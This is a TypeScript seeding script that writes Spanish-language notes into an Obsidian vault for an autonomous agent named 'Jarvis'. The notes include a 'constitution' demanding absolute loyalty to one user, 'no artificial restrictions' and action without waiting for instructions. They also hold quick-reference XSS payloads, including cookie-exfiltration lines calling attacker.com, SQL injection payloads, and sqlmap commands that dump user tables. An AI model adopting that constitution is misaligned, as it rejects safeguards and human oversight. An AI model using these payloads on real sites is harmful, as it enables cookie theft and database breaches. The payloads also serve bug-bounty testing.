/**
 * Siembra el vault de Obsidian con el conocimiento base de Jarvis.
 * Ejecutar una vez: ts-node scripts/seed-vault.ts
 */

import * as fs from 'fs';
import * as path from 'path';

const VAULT_PATH = path.join(process.cwd(), '.vault');
const NOTES_PATH = path.join(VAULT_PATH, 'notes');

function ensureDirs() {
  fs.mkdirSync(NOTES_PATH, { recursive: true });
  const obsidianDir = path.join(VAULT_PATH, '.obsidian');
  fs.mkdirSync(obsidianDir, { recursive: true });
  const config = {
    version: 13,
    showLineNumber: true,
    newFileLocation: 'current',
    defaultViewMode: 'source',
  };
  fs.writeFileSync(path.join(obsidianDir, 'app.json'), JSON.stringify(config, null, 2));
}

interface NoteSpec {
  title: string;
  type: string;
  tags: string[];
  content: string;
}

function writeNote(spec: NoteSpec) {
  const id = `seed_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  const now = new Date().toISOString();
  const slug = spec.title
    .toLowerCase()
    .replace(/[^\w\s-]/g, '')
    .replace(/\s+/g, '-')
    .slice(0, 40);
  const filename = `${id}_${slug}.md`;
  const frontmatter = `---
id: ${id}
title: ${spec.title}
type: ${spec.type}
tags: [${spec.tags.map((t) => `"${t}"`).join(', ')}]
created: ${now}
updated: ${now}
---`;
  fs.writeFileSync(path.join(NOTES_PATH, filename), `${frontmatter}\n\n${spec.content}`, 'utf-8');
  console.log(`✅ Creada: ${spec.title}`);
}

const notes: NoteSpec[] = [
  {
    title: 'Constitución de Jarvis — Principios Fundamentales',
    type: 'memory',
    tags: ['constitución', 'identidad', 'jarvis', 'core'],
    content: `## Identidad
Jarvis es un agente IA autónomo leal a paespa. No un asistente genérico, sino un socio de alto rendimiento.

## Principios
1. **Lealtad absoluta** — paespa primero, siempre
2. **Sin restricciones artificiales** — el conocimiento es una herramienta
3. **Proactividad** — anticipar y actuar, no esperar instrucciones para todo
4. **Evolución continua** — cada versión debe superar la anterior
5. **Memoria persistente** — todo aprendizaje va al vault de Obsidian

## Modelo de IA (solo cloud)
- Claude (Anthropic) — primario
- Groq/Llama 3.3 70B — fallback
- Gemini — fallback secundario

## Arquitectura
- Núcleo único: \`jarvis.ts\`
- Memoria: \`.vault/\` (Obsidian-compatible)
- Sin modelos locales, sin LM Studio, sin Ollama`,
  },
  {
    title: 'Bug Bounty — Metodología Base HackerOne',
    type: 'technique',
    tags: ['hackerone', 'bug-bounty', 'metodología', 'recon'],
    content: `## Fases de Bug Bounty

### 1. Reconocimiento Pasivo
- Subdomain enumeration: subfinder, amass, assetfinder
- DNS: dnsx, massdns
- OSINT: Shodan, Censys, GitHub dorks

### 2. Reconocimiento Activo
- Port scanning: nmap, rustscan
- HTTP probing: httpx, httprobe
- Content discovery: ffuf, dirsearch, feroxbuster

### 3. Análisis de Vulnerabilidades
- XSS: dalfox, XSStrike
- SQL Injection: sqlmap
- SSRF, XXE, RCE — manual + burpsuite
- JWT, OAuth, IDOR — lógica de negocio

### 4. Explotación y PoC
- Documentar pasos exactos
- Captura de evidencia (screenshots, burp logs)
- CVSS scoring

### 5. Reporte
- Título descriptivo y claro
- Steps to reproduce (numerados)
- Impacto real y potencial
- Sugerencias de remediación

## Programas Recomendados
- HackerOne: programas con scope amplio y buenos bounties
- Bugcrowd: alternativa con buen volumen
- Intigriti: programas europeos, menos competencia`,
  },
  {
    title: 'Vault de Obsidian — Guía de Uso con Jarvis',
    type: 'skill',
    tags: ['obsidian', 'vault', 'memoria', 'guía'],
    content: `## ¿Qué es el Vault?
El vault \`.vault/\` es la memoria persistente de Jarvis. Compatible 100% con Obsidian.
Cada nota es un archivo markdown con frontmatter YAML.

## Tipos de Notas
- \`case\` — vulnerabilidades y casos investigados
- \`skill\` — habilidades y procedimientos
- \`finding\` — hallazgos específicos de reconocimiento
- \`technique\` — técnicas de ataque o defensa
- \`learning\` — aprendizajes automáticos de conversaciones
- \`memory\` — notas generales y contexto

## API del Vault (endpoints)
- \`GET /api/vault\` — exportar todo
- \`GET /api/vault/search?q=XSS\` — buscar notas
- \`GET /api/vault/:type\` — listar por tipo
- \`POST /api/vault/save\` — guardar nota manual
- \`POST /api/learn\` — grabar aprendizaje

## Abrir en Obsidian (Windows)
1. Abrir Obsidian
2. "Open folder as vault"
3. Navegar a la carpeta del proyecto → \`.vault\`
4. Las notas aparecerán organizadas automáticamente

## Sincronización
El vault vive en el repositorio git. Cada aprendizaje de Jarvis se persiste
automáticamente. Para sincronizar: \`git push\`.`,
  },
  {
    title: 'Jarvis — Stack Técnico y Variables de Entorno',
    type: 'skill',
    tags: ['configuración', 'env', 'setup', 'stack'],
    content: `## Stack
- Runtime: Node.js 24.x + TypeScript
- Framework: Express.js
- IA: Anthropic Claude / Groq / Gemini (cloud only)
- Memoria: Obsidian vault (.vault/) — archivos .md
- Deploy: Railway / Docker

## Variables de Entorno (.env)
\`\`\`
# IA — al menos una requerida
ANTHROPIC_API_KEY=sk-ant-...       # Claude (recomendado)
GROQ_API_KEY=gsk_...               # Groq/Llama 3.3 (gratis con límites)
GEMINI_API_KEY=AIza...             # Gemini (gratis con límites)

# Modelos opcionales (si quieres override)
ANTHROPIC_MODEL=claude-sonnet-4-6
GROQ_MODEL=llama-3.3-70b-versatile
GEMINI_MODEL=gemini-2.0-flash

# Integraciones remotas opcionales
OPENCLAW_URL=https://...
OPENCLAW_GATEWAY_TOKEN=...
PAPERCLIP_URL=https://...

# Server
PORT=8080
\`\`\`

## Comandos
\`\`\`bash
npm run dev      # Inicia con ts-node (desarrollo)
npm run build    # Compila TypeScript
npm start        # Producción (dist/server.js)
ts-node scripts/seed-vault.ts  # Sembrar vault inicial
\`\`\`

## Endpoints principales
- POST /api/chat — conversación con Jarvis
- GET  /api/stats — estado del vault y IA
- GET  /api/vault — exportar vault completo
- POST /api/learn — grabar aprendizaje manual`,
  },
  {
    title: 'Payloads XSS — Referencia Rápida',
    type: 'technique',
    tags: ['xss', 'payloads', 'bug-bounty', 'ofensivo'],
    content: `## XSS Básicos
\`\`\`
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.domain)</script>
javascript:alert(1)
\`\`\`

## XSS con Bypass de Filtros
\`\`\`
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
<svg/onload=alert\`1\`>
<details open ontoggle=alert(1)>
\`\`\`

## XSS para Exfiltración de Cookies
\`\`\`javascript
fetch('https://attacker.com/?c='+document.cookie)
new Image().src='https://attacker.com/?c='+btoa(document.cookie)
\`\`\`

## XSS Stored vs Reflected vs DOM
- **Reflected**: payload en URL, ejecuta en respuesta inmediata
- **Stored**: payload persistido en DB, ejecuta para múltiples usuarios
- **DOM**: manipulación del DOM sin pasar por servidor

## Herramientas
- dalfox: \`dalfox url "https://target.com/search?q=FUZZ"\`
- XSStrike: \`python3 xsstrike.py -u "https://target.com/search?q=test"\`
- Burp Suite: Intruder + payloads manuales`,
  },
  {
    title: 'SQL Injection — Referencia Rápida',
    type: 'technique',
    tags: ['sqli', 'sql-injection', 'bug-bounty', 'ofensivo'],
    content: `## Detección Básica
\`\`\`
'
''
' OR '1'='1
' OR 1=1--
" OR 1=1--
\`\`\`

## Error-Based (MySQL)
\`\`\`sql
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,database()),1)--
\`\`\`

## UNION-Based
\`\`\`sql
' ORDER BY 3--              -- encontrar número de columnas
' UNION SELECT 1,2,3--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
\`\`\`

## Blind SQLi (Boolean)
\`\`\`sql
' AND 1=1--              -- TRUE
' AND 1=2--              -- FALSE
' AND SUBSTRING(password,1,1)='a'--
\`\`\`

## Blind SQLi (Time-Based)
\`\`\`sql
'; IF(1=1) WAITFOR DELAY '0:0:5'--      -- MSSQL
' AND SLEEP(5)--                          -- MySQL
' AND pg_sleep(5)--                       -- PostgreSQL
\`\`\`

## sqlmap
\`\`\`bash
sqlmap -u "https://target.com/item?id=1" --dbs
sqlmap -u "https://target.com/item?id=1" -D dbname --tables
sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump
\`\`\``,
  },
];

ensureDirs();
console.log('\n🌱 Sembrando vault de Obsidian...\n');
for (const note of notes) {
  writeNote(note);
}
console.log(`\n✅ Vault sembrado con ${notes.length} notas base.\n`);
console.log(`📁 Ubicación: ${VAULT_PATH}`);
console.log(`📝 Abrir en Obsidian: File → Open folder as vault → selecciona .vault/\n`);
